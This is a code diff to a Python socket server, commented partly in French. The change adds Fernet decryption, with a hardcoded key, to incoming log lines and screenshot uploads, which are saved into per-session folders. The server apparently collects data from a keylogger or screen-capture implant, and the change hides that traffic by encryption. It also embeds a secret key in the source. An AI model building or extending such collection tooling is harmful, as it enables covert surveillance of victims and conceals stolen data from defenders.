@@ -3,7 +3,7 @@ import socket
 import os
 import sys
 import datetime
-import threading
+from cryptography.fernet import Fernet
 
 def generate_session_folder():
     """Creates a timestamped folder for this session."""
@@ -14,6 +14,10 @@ def generate_session_folder():
     return folder_name
 
 def main():
+    # Clé partagée (doit être la même que celle du client)
+    KEY = b'fwFi-YG7gxGvBzeN8UBcyQ5_Vmhwcf0V4FGBKFcHqPI='
+    fernet = Fernet(KEY)
+
     # Generate unique session folder
     session_folder = generate_session_folder()
     print(f"[+] Session folder created: {session_folder}")
@@ -65,8 +69,13 @@ def main():
                     line = line.strip().decode("utf-8", errors="ignore")
 
                     if line.startswith("LOG|"):
-                        message = line[4:]
-                        log_and_print(f"[📝 LOG] {message}")
+                        encrypted_message_b64 = line[4:]
+                        try:
+                            # Décrypter le message log
+                            decrypted_message = fernet.decrypt(encrypted_message_b64.encode()).decode()
+                            log_and_print(f"[📝 LOG] {decrypted_message}")
+                        except Exception as e:
+                            log_and_print(f"[❌] Erreur déchiffrement log : {e}")
 
                     elif line.startswith("IMAGE|"):
                         try:
@@ -74,25 +83,28 @@ def main():
                             size = int(size_str)
                             log_and_print(f"[📸] Receiving image: {filename} ({size} bytes)")
                             
-                            # Receive exactly 'size' bytes
-                            image_data = b""
+                            # Receive exactly 'size' bytes (données chiffrées)
+                            encrypted_image_data = b""
                             remaining = size
                             while remaining > 0:
                                 chunk = conn.recv(min(4096, remaining))
                                 if not chunk:
-                                    raise ConnectionError("Connection closed during transfer")
-                                image_data += chunk
+                                    raise ConnectionError("Connection closed during image transfer")
+                                encrypted_image_data += chunk
                                 remaining -= len(chunk)
-                                print(f"[📸] Received {len(image_data)}/{size} bytes")
+                                print(f"[📸] Received {len(encrypted_image_data)}/{size} bytes")
                             
-                            # Save image
+                            # Déchiffrer l'image
+                            image_data = fernet.decrypt(encrypted_image_data)
+                            
+                            # Save image decrypted
                             image_path = os.path.join(session_folder, "screenshots", filename)
                             with open(image_path, "wb") as f:
                                 f.write(image_data)
                             log_and_print(f"[✅] Image saved: {image_path}")
                             
                         except Exception as e:
-                            log_and_print(f"[❌] Error receiving image: {e}")
+                            log_and_print(f"[❌] Error receiving/decrypting image: {e}")
 
                     else:
                         log_and_print(f"[📡 UNKNOWN] {line}")
